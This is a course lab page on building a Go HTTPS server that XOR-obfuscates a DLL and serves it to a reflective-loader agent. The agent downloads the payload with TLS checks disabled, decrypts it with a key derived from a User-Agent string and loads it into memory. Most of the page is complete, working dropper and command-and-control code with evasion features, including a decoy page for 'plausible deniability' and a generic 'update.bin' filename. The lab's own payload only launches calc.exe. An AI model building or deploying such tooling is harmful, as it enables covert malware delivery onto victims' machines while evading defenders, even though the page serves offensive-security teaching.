---
showTableOfContents: true
title: "Client + Server Logic (Lab 8.1)"
type: "page"
---
## Goal
In this lab we'll integrate the core functionality for both our client and server. Specifically, we will:
1. Create a simple HTTPS server in Go that listens for requests, authenticates clients based on a custom User-Agent, derives a session key, reads the original `calc_dll.dll`, obfuscates it on-the-fly using rolling XOR, and serve the obfuscated payload.
2. Modify the reflective loader (agent) to act as an HTTPS client. It will contact the server, send appropriate headers (including timestamp and a placeholder client ID in the User-Agent), download the obfuscated payload, derive the correct decryption key using the _same_ parameters, decrypt the payload, and then proceed with the reflective loading process.


## Prerequisites
We'll once again use our `calc_dll.dll` file (64-bit) from Lab 1.1, as well as our completed loader code from Lab 7.2 (incorporating rolling XOR and key derivation logic). Additionally, I'll use `openssl` to generate a self-signed cert, feel free to use the same or something equivalent.


## Generate Self-Signed Certificates
Open a terminal and navigate to the directory where you intend to run the server from.

Run the following command (this creates a key and cert valid for 365 days without prompting for details):

```
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -sha256 -days 365 -nodes -subj "/CN=localhost"
```

Once you've run the command you can use `ls` to confirm you've created 2 files - `server.key` (your private key) and `server.crt` (your certificate). Keep these in the directory where you will run the server.
```shell
❯ ls
server.crt server.key
```



## Create the Basic HTTPS Server
### Code
In the same directory as your private key and cert create the following file, call it `server_dll.go`. Note that I hardcoded port 443 here which means you'll have to run it with `sudo`/admin privs, if you prefer not to need to do that change to any port above 1024. Also, I'm hardcoding the path to our DLL, if you wanted to instead provide it as a CLA, feel free to incorporate the same logic we're using on the reflective loader side.

```Go
package main

import (
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"time"
)

// --- Configuration (Hardcoded for Simplicity) ---
var (
	payloadPath string = "calc_dll.dll" // Path to the ORIGINAL DLL payload file
	certPath    string = "server.crt"   // Path to the TLS certificate
	keyPath     string = "server.key"   // Path to the TLS private key
	listenAddr  string = "0.0.0.0:8443" // Address:port to listen on (use 8443 if 443 needs sudo)
	verbose     bool   = true           // Enable verbose logging for the lab
)

// --- Logging (Simplified) ---
func initLogging() {
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	if verbose {
		log.Println("Verbose logging enabled.")
	}
	// In a real scenario, log to file here using logPath
}

// --- Key Derivation Constants and Functions (Copy from Lab 7.2) ---
const (
	SECTION_ALIGN_REQUIRED    = 0x53616D70 // "Samp"
	FILE_ALIGN_MINIMAL        = 0x6C652D6B // "le-k"
	PE_BASE_ALIGNMENT         = 0x65792D76 // "ey-v"
	IMAGE_SUBSYSTEM_ALIGNMENT = 0x616C7565 // "alue"
	PE_CHECKSUM_SEED          = 0x67891011 // Seed for second part
)

func getPESectionAlignmentString() string { /* ... implementation ... */
	buffer := make([]byte, 16)
	binary.LittleEndian.PutUint32(buffer[0:4], SECTION_ALIGN_REQUIRED)
	binary.LittleEndian.PutUint32(buffer[4:8], FILE_ALIGN_MINIMAL)
	binary.LittleEndian.PutUint32(buffer[8:12], PE_BASE_ALIGNMENT)
	binary.LittleEndian.PutUint32(buffer[12:16], IMAGE_SUBSYSTEM_ALIGNMENT)
	return string(buffer)
}
func verifyPEChecksumValue(seed uint32) string { /* ... implementation ... */
	result := make([]byte, 4)
	checksum := seed
	for i := 0; i < 4; i++ {
		checksum = ((checksum << 3) | (checksum >> 29)) ^ uint32(i*0x37)
		result[i] = byte(checksum & 0xFF)
	}
	return string(result)
}

func generatePEValidationKey() string { /* ... implementation ... */
	alignmentSignature := getPESectionAlignmentString()
	checksumSignature := verifyPEChecksumValue(PE_CHECKSUM_SEED)
	return alignmentSignature + checksumSignature
}

func deriveKeyFromParams(timestamp, clientID string, sharedSecret string) string { /* ... implementation ... */
	combined := sharedSecret + timestamp + clientID
	key := make([]byte, 32)
	lenCombined := len(combined)
	if lenCombined == 0 {
		return string(key)
	}
	for i := 0; i < 32; i++ {
		key[i] = combined[i%lenCombined]
	}
	return string(key)
}

// --- Rolling XOR Function (Copy from Lab 7.1, renamed) ---
func xorEncryptDecrypt(data []byte, key []byte) []byte { /* ... implementation (same as rollingXor) ... */
	keyBytes := []byte(key)
	keyLen := len(keyBytes)
	result := make([]byte, len(data))
	if len(data) == 0 {
		return []byte{}
	}
	if keyLen == 0 {
		log.Println("[!] Warning: XOR key is empty.")
		copy(result, data)
		return result
	}
	for i := 0; i < len(data); i++ {
		keyByte := keyBytes[i%keyLen] ^ byte(i&0xFF)
		result[i] = data[i] ^ keyByte
	}
	return result
}

// Extract client information from User-Agent (e.g., rv:TIMESTAMP-CLIENTID)
func extractClientInfo(userAgent string) (string, string, error) {
	re := regexp.MustCompile(`rv:(\d+)-([A-Za-z0-9_-]+)`) // Look for rv: followed by digits-alphanum/hyphen/underscore
	matches := re.FindStringSubmatch(userAgent)
	if len(matches) != 3 {
		return "", "", fmt.Errorf("invalid User-Agent format or missing rv tag")
	}
	timestamp := matches[1]
	clientID := matches[2]
	return timestamp, clientID, nil
}

// Authenticate client (simple timestamp check for this lab)
func authenticateClient(timestamp, clientID string) bool {
	ts, err := strconv.ParseInt(timestamp, 10, 64)
	if err != nil {
		log.Printf("Auth Error: Invalid timestamp format: %s", timestamp)
		return false
	}
	now := time.Now().Unix()
	// Allow a +/- 30-minute window for clock skew in this lab
	if now-ts > 1800 || ts-now > 1800 {
		log.Printf("Auth Error: Timestamp out of acceptable range (%d vs now %d)", ts, now)
		return false
	}
	// Basic check on clientID format (could be more specific)
	if len(clientID) < 5 {
		log.Printf("Auth Error: ClientID too short: %s", clientID)
		return false
	}
	// For this lab, we accept any clientID matching the placeholder format used by the client
	// In a real scenario, you might check against a known list or pattern.
	log.Printf("Timestamp valid, ClientID format acceptable: %s", clientID)
	return true
}

// --- HTTP Handlers ---

// Handler for payload delivery at /update
func handlePayloadRequest(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr
	log.Printf("INFO: Incoming request for /update from %s", clientIP)

	userAgent := r.Header.Get("User-Agent")
	if userAgent == "" {
		log.Printf("ERROR: No User-Agent provided from %s", clientIP)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}
	if verbose {
		log.Printf("INFO: User-Agent: %s", userAgent)
	}

	timestamp, clientID, err := extractClientInfo(userAgent)
	if err != nil {
		log.Printf("ERROR: Failed to extract client info from %s: %v", clientIP, err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}
	log.Printf("INFO: Extracted Timestamp: %s, ClientID: %s", timestamp, clientID)

	if !authenticateClient(timestamp, clientID) {
		log.Printf("ERROR: Authentication failed for client '%s' from %s", clientID, clientIP)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	log.Printf("INFO: Authentication successful for client '%s'", clientID)

	sharedSecret := generatePEValidationKey()
	encryptionKey := deriveKeyFromParams(timestamp, clientID, sharedSecret)
	// log.Printf("INFO: Derived Key (Hex): %X", []byte(encryptionKey)) // Optional: Debug logging

	payloadBytes, err := ioutil.ReadFile(payloadPath) // Read ORIGINAL DLL
	if err != nil {
		log.Printf("ERROR: Failed to read payload file '%s': %v", payloadPath, err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	log.Printf("INFO: Read %d bytes from payload file '%s'", len(payloadBytes), payloadPath)

	obfuscatedPayload := xorEncryptDecrypt(payloadBytes, []byte(encryptionKey))
	log.Printf("INFO: Obfuscated payload (%d bytes) ready for delivery.", len(obfuscatedPayload))

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", "attachment; filename=update.bin") // Generic filename
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(obfuscatedPayload)))
	w.WriteHeader(http.StatusOK) // Explicitly set status OK
	_, err = w.Write(obfuscatedPayload)
	if err != nil {
		log.Printf("ERROR: Failed to write payload to response for %s: %v", clientIP, err)
		// Too late to send http.Error if headers/body already partially written
		return
	}

	log.Printf("INFO: Delivered %d bytes of obfuscated payload to %s (%s)", len(obfuscatedPayload), clientID, clientIP)
}

// Default handler for plausible deniability
func handleDefault(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr
	log.Printf("INFO: Default handler request from %s for %s", clientIP, r.URL.Path)
	// Serve a simple HTML page
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprintln(w, "<html><body><h1>Service Endpoint</h1><p>OK</p></body></html>")
}

// --- Main Server Setup ---
func main() {
	initLogging()
	log.Println("[+] Starting Basic HTTPS Payload Server...")

	// Verify necessary files exist
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		log.Fatalf("Payload file not found: %s", payloadPath)
	}
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		log.Fatalf("TLS certificate not found: %s", certPath)
	}
	if _, err := os.Stat(keyPath); os.IsNotExist(err) {
		log.Fatalf("TLS private key not found: %s", keyPath)
	}

	// Setup HTTP handlers
	http.HandleFunc("/update", handlePayloadRequest)
	http.HandleFunc("/", handleDefault) // Catch-all for other paths

	log.Printf("INFO: Server listening on %s", listenAddr)
	log.Printf("INFO: Serving payload from: %s", payloadPath)
	log.Printf("INFO: Using TLS cert: %s, key: %s", certPath, keyPath)

	// Start HTTPS server
	err := http.ListenAndServeTLS(listenAddr, certPath, keyPath, nil) // nil uses DefaultServeMux where handlers were registered
	if err != nil {
		log.Fatalf("[-] Server failed: %v", err)
	}
}

```


### Code Breakdown
- Right at the top we are declaring a number of variables (`var`) which defines important information like the location of our cert, key, payload, port to listen on etc.
- We then have our constants and function from Lab 7.2 used to derive our key - `getPESectionAlignmentString`, `verifyPEChecksumValue`, `generatePEValidationKey`, and `deriveKeyFromParams`.
- Following this is `xorEncryptDecrypt` - which in this case of course will be used to encrypt our payload immediately prior to it going on the wire.
- We then have our function `extractClientInfo`, which uses regex to extract the `timestamp` and `clientID` from the `User-Agent` HTTP Header.
- `authenticateClient` illustrates a very simple way to authenticate clients based on whether the timestamp is in a 30-minute windows from the server. As mentioned in the theoretical section, this concept has a few flaws, but is included mainly for illustrative purposes - we'll build much better authentication systems in future courses.
- `handlePayloadRequest` is our handler - i.e. the function that's called when our agent (reflective loader) hits our `/update` endpoint.
- `handleDefault` is called if someone, or for example a scanner, hits the root endpoint (`/`). It displays a generic message in an attempt to appear like this is just a normal web server - it creates some level of "plausible deniability".
- our `main()` function loads all the required files, defines the endpoints, and starts a listener.


## Modify the Loader (Agent)
We'll now of course also want to ensure our loader is able to communicate with our server by integrating client (agent) functionality. Starting off with the exact same code we ended up with in Lab 7.2, make the following changes.

### Code - Add our Client Function
First add the following function, which is going to connect to our server and download the payload.

```go
// downloadPayload connects to the server and retrieves the obfuscated payload
func downloadPayload(serverURL string, clientID string) ([]byte, string, error) { // Returns obfuscated bytes, timestamp used, error
	fmt.Printf("[+] Connecting to server: %s\n", serverURL)

	// Create HTTP client, skipping TLS verification for self-signed certs
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}

	// Generate timestamp (must be used for key derivation later)
	timestamp := fmt.Sprintf("%d", time.Now().Unix())
	fmt.Printf("[+] Using Timestamp: %s\n", timestamp)
	fmt.Printf("[+] Using ClientID: %s\n", clientID) // Using placeholder for this lab

	// Create custom User-Agent
	// Format MUST match what the server's extractClientInfo expects
	customUA := fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) rv:%s-%s", timestamp, clientID)
	fmt.Printf("[+] Sending User-Agent: %s\n", customUA)

	// Create GET request
	req, err := http.NewRequest("GET", serverURL, nil)
	if err != nil {
		return nil, "", fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("User-Agent", customUA)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return nil, "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	// Check status code
	if resp.StatusCode != http.StatusOK {
		// Try reading body for more info if possible
		bodyBytes, _ := ioutil.ReadAll(resp.Body)
		return nil, "", fmt.Errorf("server returned error: %d - %s", resp.StatusCode, string(bodyBytes))
	}

	// Read response body (this is the obfuscated payload)
	obfuscatedData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, "", fmt.Errorf("failed to read response body: %w", err)
	}

	fmt.Printf("[+] Downloaded %d bytes of obfuscated payload.\n", len(obfuscatedData))
	return obfuscatedData, timestamp, nil // Return payload AND timestamp
}
```


### Code Breakdown
- `client` is a client instance we are creating from the `net/http` library - this will allow us to connect to our listener, which is of course also from the go `net/http` library.
- `customUA` is our custom User-Agent, which will  contain the `timestamp` and `clientID` used for environmental key derivation. Note that we are still relying on the placeholder data here for `clientID`, we'll replace this with our actual implementation in the next lab.
- `http.NewRequest` creates our request
- `req.Header.Set` ensures we are using our new User-Agent
- `client.Do` actually sends the request
- `obfuscatedData` is the response body - ie our obfuscated payload
- You can see we'll then return that, as well as the `timestamp`.


### Code - Altering main()
We'll now have to adjust our `main()` to use this new logic since we no longer want to load out payload from disk, but of course we want to download it from our server (`obfuscatedData`) and inject directly into memory .

Inside of main we you leave this first check in place.
```go
if runtime.GOOS != "windows" {  
    log.Fatal("[-] This program must be run on Windows.")  
}
```


Then remove all this logic starting with this line:
```go
fmt.Println("[+] Starting Manual DLL Mapper (with IAT Resolution)...")
```

Until this line:
```go
fmt.Printf("[+] Decryption complete. Resulting size: %d bytes.\n", len(dllBytes))
```

In my file it's lines 163 - 199, so should be more or less the same length at least in your file.

In it's place we'll add the following logic. **You will of course need to replace the `serverURL` IP with that of your remote machine running the server.**
```go
	fmt.Println("[+] Reflective Loader Agent (Network Download)")

	// --- Configuration ---
	serverURL := "https://192.168.2.123:8443/update"
	// Placeholder ClientID - MUST be acceptable to server's authenticateClient
	clientID := "MyTestClient-9876"

	// --- Download Payload ---
	fmt.Println("[+] Downloading payload...")
	obfuscatedBytes, timestampUsed, err := downloadPayload(serverURL, clientID)
	if err != nil {
		log.Fatalf("[-] Failed to download payload: %v", err)
	}
	// NOTE: obfuscatedBytes now holds the raw downloaded data

	// --- Derive Key (using downloaded parameters) ---
	fmt.Println("[+] Deriving decryption key...")
	sharedSecret := generatePEValidationKey()
	// IMPORTANT: Use the timestamp that was actually sent in the request!
	finalKey := deriveKeyFromParams(timestampUsed, clientID, sharedSecret)
	fmt.Printf("    Using Timestamp for Key: %s\n", timestampUsed)
	fmt.Printf("    Using ClientID for Key: %s\n", clientID)
	// fmt.Printf("    Shared Secret (generated): %s\n", sharedSecret) // Debug
	// fmt.Printf("    Final Key (derived, Hex): %X\n", []byte(finalKey)) // Debug

	// --- Decrypt using Rolling XOR and Derived Key ---
	fmt.Println("[+] Decrypting downloaded content...")
	dllBytes := xorEncryptDecrypt(obfuscatedBytes, []byte(finalKey)) // Decrypt
	fmt.Printf("[+] Decryption complete. Resulting size: %d bytes.\n", len(dllBytes))
```


### Code Breakdown
- We'll immediately call `downloadPayload`, which, as we just saw will return the obfuscated payload and timestamp.
- `sharedSecret` represent the static component of our key derivation logic (the "faux PE constants")
- `finalKey` results from calling `deriveKeyFromParams` with the static component (`sharedSecret`) as well as our dynamic component (`timestampUsed` + `clientID`)
- We can then use this key, along with our obfuscated payload, to call `xorEncryptDecrypt`, which will of course return our final, defobfuscated payload.


## Instructions

First, let's run the server, you can once again either use `go build`, or from the directory containing the server, private key, cert, and `calc_dll.dll`simply run:

```
go run .
```

Just a reminder if you chose port 443 you'll have to use `sudo`, or admin privs in Windows.


Then, compile the new loader+agent application, and copy it over to target system.

```shell
GOOS=windows GOARCH=amd64 go build  
```


Once on your target system simply invoke the application, we no longer have to provide a command-line argument since the payload will be downloaded, not loaded from disk.

## Results
Running the server should produce the following output.
```
❯ go run .
2025/04/26 09:39:39 server_dll.go:28: Verbose logging enabled.
2025/04/26 09:39:39 server_dll.go:208: [+] Starting Basic HTTPS Payload Server...
2025/04/26 09:39:39 server_dll.go:225: INFO: Server listening on 0.0.0.0:8443
2025/04/26 09:39:39 server_dll.go:226: INFO: Serving payload from: calc_dll.dll
2025/04/26 09:39:39 server_dll.go:227: INFO: Using TLS cert: server.crt, key: server.key
```


Then running the agent on the target system will produce the following output.
```shell
PS C:\Users\vuilhond\Desktop> .\reflect_agent.exe
[+] Reflective Loader Agent (Network Download)
[+] Downloading payload...
[+] Connecting to server: https://192.168.2.123:8443/update
[+] Using Timestamp: 1745678329
[+] Using ClientID: MyTestClient-9876
[+] Sending User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) rv:1745678329-MyTestClient-9876
[+] Downloaded 111493 bytes of obfuscated payload.
[+] Deriving decryption key...
    Using Timestamp for Key: 1745678329
    Using ClientID for Key: MyTestClient-9876
[+] Decrypting downloaded content...
[+] Decryption complete. Resulting size: 111493 bytes.

// REST OF THE OUTPUT REMAINS THE SAME AS BEFORE
```

And of course, you should once again see `calc.exe` launch.


## Discussion
We have now implemented basic client-server communication over HTTPS. The agent downloads our obfuscated payload dynamically, derives the correct session key using information passed in the User-Agent, decrypts the payload, and reflectively loads it.

## Conclusion
Our next, final lab of the course, we'll replace our placeholder clientID value in the agent with the ability to derive it from the hostname + HD serial number, as we outlined in the theoretical section.



---
[|TOC|]({{< ref "../moc.md" >}})
[|PREV|]({{< ref "client_id.md" >}})
[|NEXT|]({{< ref "key_lab.md" >}})